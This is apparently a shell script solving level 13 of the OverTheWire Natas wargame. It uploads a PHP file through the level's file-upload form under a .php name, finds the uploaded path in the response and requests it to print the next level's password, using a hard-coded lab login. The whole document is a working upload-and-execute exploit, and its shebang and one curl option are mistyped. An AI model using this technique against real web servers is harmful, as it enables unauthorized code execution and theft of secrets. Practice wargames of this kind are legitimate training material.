#/bin/sh

RESPONSE=$(curl --silen \
                --form "filename=foobarquxq.php" \
                --form "uploadedfile=@./resources/natas13.php" \
                --form "submit=Submit" \
                --user natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY \
                http://natas13.natas.labs.overthewire.org/index.php)

UPLOADED_FILE_RELATIVE_PATH=$(echo ${RESPONSE} | grep -Eo  ">upload/[A-Za-z0-9]{10}.php<" | grep -Eo "upload/[A-Za-z0-9]{10}.php")

PASSWORD=$(curl --silent \
                --user natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY \
                http://natas13.natas.labs.overthewire.org/${UPLOADED_FILE_RELATIVE_PATH})

printf "The password for natas14 is: ${PASSWORD}\n"
